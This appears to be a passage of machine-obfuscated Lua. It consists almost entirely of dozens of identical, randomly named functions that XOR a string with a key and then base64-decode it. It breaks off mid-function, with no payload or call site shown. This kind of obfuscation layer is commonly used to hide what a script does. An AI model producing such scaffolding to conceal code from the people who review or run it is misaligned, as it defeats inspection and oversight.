    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zqrlhu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ueyxio(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fnktqn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bsbwxr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wzqena(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_blfleo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_hntrwt(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ujhkhu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_znevjp(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_njkg_y(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xyvjvq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ktxdtx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rdutqc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fhnyak(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pivoul(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bkeurl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zyrjrt(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_lpabvv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_prmsch(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rwfocq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cqxgkq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tdvlqa(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_lodics(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_clts_t(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__yptrh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_muvwuc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vpggyb(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_luhalr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kgih_u(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gimedn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dznzqu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_mej_pj(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__devsc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_p_kkoc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rt_lpe(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uwqozi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xazdkw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
